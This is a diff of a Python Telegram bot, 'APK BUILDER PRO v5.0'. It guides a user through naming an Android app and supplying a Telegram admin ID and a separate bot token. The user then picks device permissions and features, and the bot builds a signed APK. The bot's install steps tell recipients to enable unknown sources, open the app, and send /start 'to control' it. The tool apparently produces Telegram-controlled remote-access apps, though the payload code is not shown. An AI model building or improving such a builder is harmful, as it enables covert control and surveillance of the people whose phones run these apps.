-        timeout=CONFIG["max_build_time"])
+        timeout=CONFIG["max_build_time"]
+    )
     if r.returncode != 0:
         raise Exception(f"Gradle:\n{r.stderr[-800:]}")
 
@@ -1186,17 +1343,21 @@ def build_apk(cfg: dict, uid: int) -> str:
 
     final = BUILD_DIR / f"{cfg['app_name'].replace(' ', '_')}_{ts}.apk"
     if CONFIG["sign_apk"]:
-        try: sign_apk(unsigned, final)
-        except Exception: shutil.copy(unsigned, final)
-    else: shutil.copy(unsigned, final)
+        try:
+            sign_apk(unsigned, final)
+        except Exception as e:
+            print(f"⚠️ فشل التوقيع: {e}")
+            shutil.copy(unsigned, final)
+    else:
+        shutil.copy(unsigned, final)
 
     shutil.rmtree(proj, ignore_errors=True)
     return str(final)
 
 
-# ═══════════════════════════════════════════════════════════════
-#                       الأوامر
-# ═══════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+#                       BOT HANDLERS
+# ═══════════════════════════════════════════════════════════════════
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     kb = [
         [InlineKeyboardButton("🚀 بناء تطبيق جديد", callback_data="new_build")],
@@ -1205,8 +1366,8 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     ]
     await update.message.reply_text(
         "╔══════════════════════════════════════╗\n"
-        "║  👑  <b>APK BUILDER PRO  v4.0</b>          ║\n"
-        "║      <i>Ultra Edition</i>                  ║\n"
+        "║  👑  <b>APK BUILDER PRO  v5.0</b>          ║\n"
+        "║      <i>Railway Ultra Edition</i>          ║\n"
         "╚══════════════════════════════════════╝\n\n"
         f"👋 مرحباً <b>{update.effective_user.first_name}</b>\n\n"
         "🎯 <b>المميزات:</b>\n"
@@ -1220,12 +1381,14 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "└ ♻️ إعادة تشغيل تلقائي\n\n"
         "اختر من القائمة 👇",
         reply_markup=InlineKeyboardMarkup(kb),
-        parse_mode=ParseMode.HTML)
+        parse_mode=ParseMode.HTML
+    )
 
 
 async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📖 <b>دليل الاستخدام</b>\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "1️⃣ اسم التطبيق\n"
         "2️⃣ اسم الحزمة (com.xxx.yyy)\n"
         "3️⃣ Telegram ID\n"
@@ -1236,49 +1399,62 @@ async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "8️⃣ الأيقونة\n"
         "9️⃣ تأكيد البناء\n\n"
         "⚠️ البوت الفرعي يجب أن يكون منفصلاً",
-        parse_mode=ParseMode.HTML)
+        parse_mode=ParseMode.HTML
+    )
 
 
 async def cb_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
+    q = update.callback_query
+    await q.answer()
     uid = q.from_user.id
     used = user_apk_count[uid]
     maxx = CONFIG["max_apk_per_user"]
-    bar = "█" * used + "░" * (maxx - used)
+    bar = "█" * used + "░" * max(0, maxx - used)
+
     await q.edit_message_text(
         f"📊 <b>إحصائياتك</b>\n\n"
         f"🆔 <code>{uid}</code>\n"
         f"📱 <b>البناءات:</b> {used}/{maxx}\n"
         f"📊 [{bar}]\n"
-        f"✅ {'متاح' if used < maxx else '⛔ تجاوزت'}",
+        f"✅ {'متاح' if used < maxx else '⛔ تجاوزت الحد'}",
         parse_mode=ParseMode.HTML,
-        reply_markup=InlineKeyboardMarkup(
-            [[InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]]))
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("🔙 رجوع", callback_data="back_home")
+        ]])
+    )
 
 
 async def cb_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
+    q = update.callback_query
+    await q.answer()
     await q.edit_message_text(
-        "📖 استخدم /help",
-        reply_markup=InlineKeyboardMarkup(
-            [[InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]]))
+        "📖 استخدم الأمر /help للتفاصيل الكاملة",
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("🔙 رجوع", callback_data="back_home")
+        ]])
+    )
 
 
 async def cb_back_home(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
+    q = update.callback_query
+    await q.answer()
     kb = [
         [InlineKeyboardButton("🚀 بناء تطبيق جديد", callback_data="new_build")],
         [InlineKeyboardButton("📊 إحصائياتي", callback_data="stats"),
          InlineKeyboardButton("📖 المساعدة", callback_data="help")],
     ]
-    await q.edit_message_text("🏠 <b>القائمة الرئيسية</b>",
-        reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)
+    await q.edit_message_text(
+        "🏠 <b>القائمة الرئيسية</b>\n\nاختر إجراءً:",
+        reply_markup=InlineKeyboardMarkup(kb),
+        parse_mode=ParseMode.HTML
+    )
 
 
-# ────────────── Conversation ──────────────
+# ────────────── Conversation Flow ──────────────
 async def new_build(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if update.callback_query:
-        q = update.callback_query; await q.answer()
+        q = update.callback_query
+        await q.answer()
         uid = q.from_user.id
         send = q.edit_message_text
     else:
@@ -1286,54 +1462,69 @@ async def new_build(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         send = update.message.reply_text
 
     if user_apk_count[uid] >= CONFIG["max_apk_per_user"]:
-        await send("⛔ تجاوزت الحد الأقصى.")
+        await send("⛔ تجاوزت الحد الأقصى للبناء.")
         return ConversationHandler.END
 
-    user_sessions[uid] = {"perms": [], "features": [],
-        "theme": "dark", "created": datetime.now()}
-    await send("📝 <b>خطوة 1/8</b>\n\nأدخل <b>اسم التطبيق</b>:",
-        parse_mode=ParseMode.HTML)
+    user_sessions[uid] = {
+        "perms": [], "features": [],
+        "theme": "dark", "created": datetime.now()
+    }
+    await send(
+        "📝 <b>خطوة 1/8</b>\n\n"
+        "أدخل <b>اسم التطبيق</b> الذي يظهر على الشاشة:",
+        parse_mode=ParseMode.HTML
+    )
     return ST_NAME
 
 
 async def st_name(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    user_sessions[uid]["app_name"] = update.message.text.strip()[:40]
+    name = update.message.text.strip()[:40]
+    user_sessions[uid]["app_name"] = name
     await update.message.reply_text(
-        f"✅ <b>{user_sessions[uid]['app_name']}</b>\n\n"
-        f"📦 <b>خطوة 2/8</b>\n\nأدخل <b>اسم الحزمة</b>:\n"
+        f"✅ الاسم: <b>{name}</b>\n\n"
+        f"📦 <b>خطوة 2/8</b>\n\n"
+        f"أدخل <b>اسم الحزمة</b>:\n"
         f"مثال: <code>com.yourname.app</code>",
-        parse_mode=ParseMode.HTML)
+        parse_mode=ParseMode.HTML
+    )
     return ST_PKG
 
 
 async def st_pkg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    import re
     uid = update.effective_user.id
     pkg = update.message.text.strip().lower()
     if not re.match(r"^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$", pkg):
-        await update.message.reply_text("❌ صيغة خاطئة. مثال: <code>com.x.y</code>",
-            parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            "❌ صيغة خاطئة. مثال: <code>com.x.y</code>",
+            parse_mode=ParseMode.HTML
+        )
         return ST_PKG
     user_sessions[uid]["pkg_name"] = pkg
     await update.message.reply_text(
         f"✅ <code>{pkg}</code>\n\n"
-        f"🆔 <b>خطوة 3/8</b>\n\nأدخل <b>Telegram ID</b>:",
-        parse_mode=ParseMode.HTML)
+        f"🆔 <b>خطوة 3/8</b>\n\n"
+        f"أدخل <b>Telegram ID</b> الخاص بك:",
+        parse_mode=ParseMode.HTML
+    )
     return ST_ADMIN
 
 
 async def st_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    try: aid = int(update.message.text.strip())
+    try:
+        aid = int(update.message.text.strip())
     except ValueError:
-        await update.message.reply_text("❌ أرسل رقماً:")
+        await update.message.reply_text("❌ أرسل رقماً صحيحاً:")
         return ST_ADMIN
     user_sessions[uid]["admin_id"] = aid
     await update.message.reply_text(
         f"✅ <code>{aid}</code>\n\n"
-        f"🔑 <b>خطوة 4/8</b>\n\nأدخل <b>توكن البوت الفرعي</b>:",
-        parse_mode=ParseMode.HTML)
+        f"🔑 <b>خطوة 4/8</b>\n\n"
+        f"أدخل <b>توكن البوت الفرعي</b>:\n"
+        f"⚠️ بوت منفصل عن بوت البناء",
+        parse_mode=ParseMode.HTML
+    )
     return ST_TOKEN
 
 
@@ -1341,11 +1532,13 @@ async def st_token(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     token = update.message.text.strip()
     if token.count(":") != 1 or len(token) < 40:
-        await update.message.reply_text("❌ توكن غير صالح:")
+        await update.message.reply_text("❌ توكن غير صالح. حاول مجدداً:")
         return ST_TOKEN
     user_sessions[uid]["bot_token"] = token
-    try: await update.message.delete()
-    except Exception: pass
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
     return await show_perms(update, ctx)
 
 
@@ -1356,30 +1549,40 @@ async def show_perms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     items = list(PERMISSIONS.items())
     for i in range(0, len(items), 2):
         row = []
-        for k, (em, name, _) in items[i:i+2]:
-            m = "✅" if k in sel else "⬜"
-            row.append(InlineKeyboardButton(f"{m} {em} {name}",
-                callback_data=f"perm:{k}"))
+        for key, (em, name, _) in items[i:i + 2]:
+            mark = "✅" if key in sel else "⬜"
+            row.append(InlineKeyboardButton(
+                f"{mark} {em} {name}", callback_data=f"perm:{key}"
+            ))
         rows.append(row)
     rows.append([InlineKeyboardButton("➡️ التالي", callback_data="perm:next")])
-    txt = "🔐 <b>خطوة 5/8 — الصلاحيات</b>"
+
+    text = "🔐 <b>خطوة 5/8 — الصلاحيات</b>\n\nاختر الصلاحيات المطلوبة:"
     if update.callback_query:
-        await update.callback_query.edit_message_text(txt,
-            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+        await update.callback_query.edit_message_text(
+            text, reply_markup=InlineKeyboardMarkup(rows),
+            parse_mode=ParseMode.HTML
+        )
     else:
-        await update.message.reply_text(txt,
-            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            text, reply_markup=InlineKeyboardMarkup(rows),
+            parse_mode=ParseMode.HTML
+        )
     return ST_PERMS
 
 
 async def cb_perms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
+    q = update.callback_query
+    await q.answer()
     uid = q.from_user.id
     data = q.data.split(":", 1)[1]
-    if data == "next": return await show_feats(update, ctx)
+    if data == "next":
+        return await show_feats(update, ctx)
     perms = user_sessions[uid]["perms"]
-    if data in perms: perms.remove(data)
-    else: perms.append(data)
+    if data in perms:
+        perms.remove(data)
+    else:
+        perms.append(data)
     return await show_perms(update, ctx)
 
 
@@ -1390,52 +1593,70 @@ async def show_feats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     items = list(FEATURES.items())
     for i in range(0, len(items), 2):
         row = []
-        for k, (em, name) in items[i:i+2]:
-            m = "✅" if k in sel else "⬜"
-            row.append(InlineKeyboardButton(f"{m} {em} {name}",
-                callback_data=f"feat:{k}"))
+        for key, (em, name) in items[i:i + 2]:
+            mark = "✅" if key in sel else "⬜"
+            row.append(InlineKeyboardButton(
+                f"{mark} {em} {name}", callback_data=f"feat:{key}"
+            ))
         rows.append(row)
     rows.append([InlineKeyboardButton("➡️ التالي", callback_data="feat:next")])
-    txt = "⚙️ <b>خطوة 6/8 — المميزات</b>"
+
+    text = "⚙️ <b>خطوة 6/8 — المميزات الإضافية</b>\n\nاختر المميزات:"
     if update.callback_query:
-        await update.callback_query.edit_message_text(txt,
-            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+        await update.callback_query.edit_message_text(
+            text, reply_markup=InlineKeyboardMarkup(rows),
+            parse_mode=ParseMode.HTML
+        )
     else:
-        await update.message.reply_text(txt,
-            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            text, reply_markup=InlineKeyboardMarkup(rows),
+            parse_mode=ParseMode.HTML
+        )
     return ST_FEATS
 
 
 async def cb_feats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
+    q = update.callback_query
+    await q.answer()
     uid = q.from_user.id
     data = q.data.split(":", 1)[1]
-    if data == "next": return await show_themes(update, ctx)
+    if data == "next":
+        return await show_themes(update, ctx)
     feats = user_sessions[uid]["features"]
-    if data in feats: feats.remove(data)
-    else: feats.append(data)
+    if data in feats:
+        feats.remove(data)
+    else:
+        feats.append(data)
     return await show_feats(update, ctx)
 
 
 async def show_themes(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     rows = [[InlineKeyboardButton(f"{em} {name}", callback_data=f"theme:{k}")]
             for k, (em, name) in THEMES.items()]
-    txt = "🎨 <b>خطوة 7/8 — السمة</b>"
+    text = "🎨 <b>خطوة 7/8 — السمة</b>\n\nاختر السمة:"
     if update.callback_query:
-        await update.callback_query.edit_message_text(txt,
-            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+        await update.callback_query.edit_message_text(
+            text, reply_markup=InlineKeyboardMarkup(rows),
+            parse_mode=ParseMode.HTML
+        )
     else:
-        await update.message.reply_text(txt,
-            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            text, reply_markup=InlineKeyboardMarkup(rows),
+            parse_mode=ParseMode.HTML
+        )
     return ST_THEME
 
 
 async def cb_theme(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
-    user_sessions[q.from_user.id]["theme"] = q.data.split(":", 1)[1]
+    q = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
+    user_sessions[uid]["theme"] = q.data.split(":", 1)[1]
     await q.edit_message_text(
-        "🖼️ <b>خطوة 8/8 — الأيقونة</b>\n\nأرسل صورة 512×512:",
-        parse_mode=ParseMode.HTML)
+        "🖼️ <b>خطوة 8/8 — الأيقونة</b>\n\n"
+        "أرسل صورة (يُفضّل 512×512):",
+        parse_mode=ParseMode.HTML
+    )
     return ST_ICON
 
 
@@ -1443,19 +1664,25 @@ async def st_icon(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if update.message.photo:
         file = await update.message.photo[-1].get_file()
-    elif update.message.document and update.message.document.mime_type.startswith("image/"):
+    elif update.message.document and \
+            update.message.document.mime_type.startswith("image/"):
         file = await update.message.document.get_file()
     else:
-        await update.message.reply_text("❌ أرسل صورة:")
+        await update.message.reply_text("❌ أرسل صورة صحيحة.")
         return ST_ICON
+
     icon_path = BUILD_DIR / f"{uid}_icon_{secrets.token_hex(4)}.png"
     await file.download_to_drive(icon_path)
+
     try:
-        img = Image.open(icon_path).convert("RGBA").resize((512, 512), Image.LANCZOS)
+        img = Image.open(icon_path).convert("RGBA").resize(
+            (512, 512), Image.LANCZOS
+        )
         img.save(icon_path, "PNG", optimize=True)
     except Exception as e:
-        await update.message.reply_text(f"❌ {e}")
+        await update.message.reply_text(f"❌ خطأ: {e}")
         return ST_ICON
+
     user_sessions[uid]["icon"] = str(icon_path)
     return await show_summary(update, ctx)
 
@@ -1463,33 +1690,70 @@ async def st_icon(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def show_summary(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     s = user_sessions[uid]
-    pt = "\n".join(f"  {PERMISSIONS[p][0]} {PERMISSIONS[p][1]}" for p in s["perms"]) or "  لا شيء"
-    ft = "\n".join(f"  {FEATURES[f][0]} {FEATURES[f][1]}" for f in s["features"]) or "  لا شيء"
-    text = (f"📋 <b>ملخص الإعدادات</b>\n\n"
-            f"📱 <b>الاسم:</b> {s['app_name']}\n"
-            f"📦 <b>الحزمة:</b> <code>{s['pkg_name']}</code>\n"
-            f"🆔 <b>Admin:</b> <code>{s['admin_id']}</code>\n"
-            f"🎨 <b>السمة:</b> {THEMES[s['theme']][1]}\n\n"
-            f"🔐 <b>الصلاحيات ({len(s['perms'])}):</b>\n{pt}\n\n"
-            f"⚙️ <b>المميزات ({len(s['features'])}):</b>\n{ft}")
-    kb = [[InlineKeyboardButton("✅ ابدأ البناء", callback_data="build:go")],
-          [InlineKeyboardButton("❌ إلغاء", callback_data="build:cancel")]]
-    msg = update.callback_query.message if update.callback_query else update.message
-    await msg.reply_text(text, reply_markup=InlineKeyboardMarkup(kb),
-        parse_mode=ParseMode.HTML)
+
+    perms_txt = "\n".join(
+        f"   {PERMISSIONS[p][0]} {PERMISSIONS[p][1]}" for p in s["perms"]
+    ) or "   لا شيء"
+    feats_txt = "\n".join(
+        f"   {FEATURES[f][0]} {FEATURES[f][1]}" for f in s["features"]
+    ) or "   لا شيء"
+
+    text = (
+        "╔═══════════════════════════════╗\n"
+        "║   📋  <b>ملخص الإعدادات</b>        ║\n"
+        "╚═══════════════════════════════╝\n\n"
+        f"📱 <b>الاسم:</b> <code>{s['app_name']}</code>\n"
+        f"📦 <b>الحزمة:</b> <code>{s['pkg_name']}</code>\n"
+        f"🆔 <b>Admin:</b> <code>{s['admin_id']}</code>\n"
+        f"🎨 <b>السمة:</b> {THEMES[s['theme']][1]}\n\n"
+        f"🔐 <b>الصلاحيات ({len(s['perms'])}):</b>\n{perms_txt}\n\n"
+        f"⚙️ <b>المميزات ({len(s['features'])}):</b>\n{feats_txt}\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "هل تريد بدء البناء؟"
+    )
+    kb = [
+        [InlineKeyboardButton("✅ نعم، ابدأ البناء", callback_data="build:go")],
+        [InlineKeyboardButton("❌ إلغاء", callback_data="build:cancel")],
+    ]
+
+    if update.callback_query:
+        await update.callback_query.edit_message_text(
+            text, reply_markup=InlineKeyboardMarkup(kb),
+            parse_mode=ParseMode.HTML
+        )
+    else:
+        await update.message.reply_text(
+            text, reply_markup=InlineKeyboardMarkup(kb),
+            parse_mode=ParseMode.HTML
+        )
     return ST_CONFIRM
 
 
 async def cb_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
+    q = update.callback_query
+    await q.answer()
     uid = q.from_user.id
     action = q.data.split(":", 1)[1]
+
     if action == "cancel":
         user_sessions.pop(uid, None)
         await q.edit_message_text("❌ تم الإلغاء.")
         return ConversationHandler.END
-    await q.edit_message_text("⚙️ <b>جاري البناء...</b>\n\n⏳ 5-15 دقيقة",
-        parse_mode=ParseMode.HTML)
+
+    await q.edit_message_text(
+        "╔══════════════════════════════╗\n"
+        "║  ⚙️  <b>جاري البناء...</b>          ║\n"
+        "╚══════════════════════════════╝\n\n"
+        "⏳ قد يستغرق 5-15 دقيقة\n"
+        "📊 سيتم إشعارك عند الانتهاء\n\n"
+        "🔄 المراحل:\n"
+        "├ إنشاء المشروع\n"
+        "├ تجميع الكود\n"
+        "├ توقيع APK\n"
+        "└ إرسال الملف",
+        parse_mode=ParseMode.HTML
+    )
+
     asyncio.create_task(build_and_send(q.message, uid, user_sessions[uid]))
     return ConversationHandler.END
 
@@ -1505,27 +1769,52 @@ async def build_and_send(message, uid: int, cfg: dict):
         apk = await asyncio.to_thread(build_apk, cfg, uid)
         size = os.path.getsize(apk) / (1024 * 1024)
         user_apk_count[uid] += 1
+
         with open(apk, "rb") as f:
             await message.reply_document(
                 document=InputFile(f, filename=os.path.basename(apk)),
-                caption=(f"✅ <b>تم البناء!</b>\n\n"
-                    f"📱 <b>{cfg['app_name']}</b>\n"
-                    f"📦 <code>{cfg['pkg_name']}</code>\n"
-                    f"💾 {size:.2f} MB\n"
-                    f"🔐 موقّع ✅\n\n"
-                    f"⚡ ثبّت APK على الجهاز"),
-                parse_mode=ParseMode.HTML)
+                caption=(
+                    "╔══════════════════════════════╗\n"
+                    "║   ✅  <b>تم البناء بنجاح!</b>       ║\n"
+                    "╚══════════════════════════════╝\n\n"
+                    f"📱 <b>الاسم:</b> {cfg['app_name']}\n"
+                    f"📦 <b>الحزمة:</b> <code>{cfg['pkg_name']}</code>\n"
+                    f"💾 <b>الحجم:</b> {size:.2f} MB\n"
+                    f"🔐 <b>التوقيع:</b> ✅\n\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "⚡ <b>خطوات التثبيت:</b>\n"
+                    "1️⃣ افتح ملف APK\n"
+                    "2️⃣ فعّل «مصادر غير معروفة»\n"
+                    "3️⃣ اضغط «تثبيت»\n"
+                    "4️⃣ افتح التطبيق\n"
+                    "5️⃣ ستُفتح نافذة البوت تلقائياً\n"
+                    "6️⃣ أرسل /start للتحكم"
+                ),
+                parse_mode=ParseMode.HTML
+            )
     except Exception as e:
-        await message.reply_text(f"❌ <b>فشل البناء</b>\n\n<code>{str(e)[:500]}</code>",
-            parse_mode=ParseMode.HTML)
+        await message.reply_text(
+            f"❌ <b>فشل البناء</b>\n\n"
+            f"<code>{str(e)[:500]}</code>",
+            parse_mode=ParseMode.HTML
+        )
     finally:
         user_sessions.pop(uid, None)
 
 
-# ═══════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+#                       MAIN
+# ═══════════════════════════════════════════════════════════════════
 def main():
-    if not BOT_TOKEN:
-        raise SystemExit("❌ BOT_TOKEN غير مضبوط")
+    print("╔══════════════════════════════════════════╗")
+    print("║   👑  APK BUILDER PRO  v5.0               ║")
+    print("║   🚂  Railway Ultra Edition               ║")
+    print("╚══════════════════════════════════════════╝")
+    print(f"✅ BOT_TOKEN: {BOT_TOKEN[:15]}...")
+    print(f"✅ ADMIN_ID: {ADMIN_ID}")
+    print(f"✅ BOT_USERNAME: {BOT_USERNAME}")
+    print("🚀 جاري التشغيل...")
+
     app = Application.builder().token(BOT_TOKEN).build()
 
     conv = ConversationHandler(
@@ -1534,15 +1823,17 @@ def main():
             CallbackQueryHandler(new_build, pattern="^new_build$"),
         ],
         states={
-            ST_NAME:  [MessageHandler(filters.TEXT & ~filters.COMMAND, st_name)],
-            ST_PKG:   [MessageHandler(filters.TEXT & ~filters.COMMAND, st_pkg)],
-            ST_ADMIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, st_admin)],
-            ST_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, st_token)],
-            ST_PERMS: [CallbackQueryHandler(cb_perms, pattern="^perm:")],
-            ST_FEATS: [CallbackQueryHandler(cb_feats, pattern="^feat:")],
-            ST_THEME: [CallbackQueryHandler(cb_theme, pattern="^theme:")],
-            ST_ICON:  [MessageHandler(filters.PHOTO | filters.Document.IMAGE, st_icon)],
-            ST_CONFIRM:[CallbackQueryHandler(cb_confirm, pattern="^build:")],
+            ST_NAME:    [MessageHandler(filters.TEXT & ~filters.COMMAND, st_name)],
+            ST_PKG:     [MessageHandler(filters.TEXT & ~filters.COMMAND, st_pkg)],
+            ST_ADMIN:   [MessageHandler(filters.TEXT & ~filters.COMMAND, st_admin)],
+            ST_TOKEN:   [MessageHandler(filters.TEXT & ~filters.COMMAND, st_token)],
+            ST_PERMS:   [CallbackQueryHandler(cb_perms, pattern="^perm:")],
+            ST_FEATS:   [CallbackQueryHandler(cb_feats, pattern="^feat:")],
+            ST_THEME:   [CallbackQueryHandler(cb_theme, pattern="^theme:")],
+            ST_ICON:    [MessageHandler(
+                filters.PHOTO | filters.Document.IMAGE, st_icon
+            )],
+            ST_CONFIRM: [CallbackQueryHandler(cb_confirm, pattern="^build:")],
         },
         fallbacks=[CommandHandler("cancel", cmd_cancel)],
         allow_reentry=True,
@@ -1555,11 +1846,8 @@ def main():
     app.add_handler(CallbackQueryHandler(cb_back_home, pattern="^back_home$"))
     app.add_handler(conv)
 
-    print("╔══════════════════════════════════════╗")
-    print("║   👑  APK BUILDER PRO  v4.0           ║")
-    print("║   🤖  جاهز للعمل...                   ║")
-    print("╚══════════════════════════════════════╝")
-    app.run_polling()
+    print("✅ البوت يعمل الآن — اضغط Ctrl+C للإيقاف")
+    app.run_polling(drop_pending_updates=True)
 
 
 if __name__ == "__main__":
